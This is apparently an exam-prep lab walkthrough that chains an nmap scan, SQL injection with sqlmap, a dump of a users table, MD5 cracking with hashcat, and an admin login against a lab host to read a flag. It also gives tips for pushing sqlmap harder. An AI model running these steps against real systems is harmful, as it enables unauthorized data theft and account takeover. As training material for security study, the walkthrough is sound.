# Scenario 05 — SQLi to Admin Hash to Portal Login

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02 Scanning, 13 SQLi, 18 Crypto, 12 Web Apps
**Tools:** [nmap](../../tools/nmap.md), [sqlmap](../../tools/sqlmap.md), [hashid](../../tools/hashid.md), [hashcat](../../tools/hashcat.md)

## Story
Target `http://10.10.10.44/login.php`. Recover the admin password and read the flag shown after login.

## Step 1 — Scan
```bash
nmap -sV -p 80,443 10.10.10.44
```
**Expected finding:** Apache + PHP login form.

## Step 2 — Identify injection point
```bash
curl -s -d "user=test&pass=test" http://10.10.10.44/login.php
sqlmap -u "http://10.10.10.44/login.php" --data="user=test&pass=test" --batch --level=3
```
**Expected finding:** `user` parameter is injectable (MySQL, boolean-based).
**→ Tool ref:** [sqlmap](../../tools/sqlmap.md)

## Step 3 — Dump the users table
```bash
sqlmap -u "http://10.10.10.44/login.php" --data="user=test&pass=test" \
       --batch --dbs
sqlmap -u "..." --data="..." -D webapp --tables
sqlmap -u "..." --data="..." -D webapp -T users --dump
```
**Expected finding:** row `admin : 5f4dcc3b5aa765d61d8327deb882cf99`.

## Step 4 — Identify + crack hash
```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > h
hashid h
hashcat -m 0 -a 0 h /usr/share/wordlists/rockyou.txt
```
**Expected finding:** `5f4dcc...:password` (classic MD5 of "password").
**→ Tool refs:** [hashid](../../tools/hashid.md), [hashcat -m 0 MD5](../../tools/hashcat.md)

## Step 5 — Log in + read flag
Visit the login form in Firefox, enter `admin` / cracked password, copy the flag from the post-login page.

## Step 6 — Final answer
**Answer format:** the flag string displayed after login.

## Gotchas across this chain
- `--batch` avoids interactive prompts and keeps sqlmap moving.
- If sqlmap says "not injectable", bump `--level=5 --risk=3` and try `--technique=BEUSTQ` individually.
- Hash mode guide: `0`=MD5, `100`=SHA1, `1400`=SHA256, `3200`=bcrypt — memorize these four.
- bcrypt (`$2y$...`) is slow — don't wait on it in the exam, pivot.
- Some labs want the *hash* as the answer, not the cracked password — read the Q carefully.

## Variant questions this scenario teaches you to handle
- "Is the login page vulnerable to SQLi?" → step 2.
- "How many databases?" → step 3 `--dbs`.
- "Dump the admin password hash" → steps 2–3.
- "Crack this MD5" → step 4.
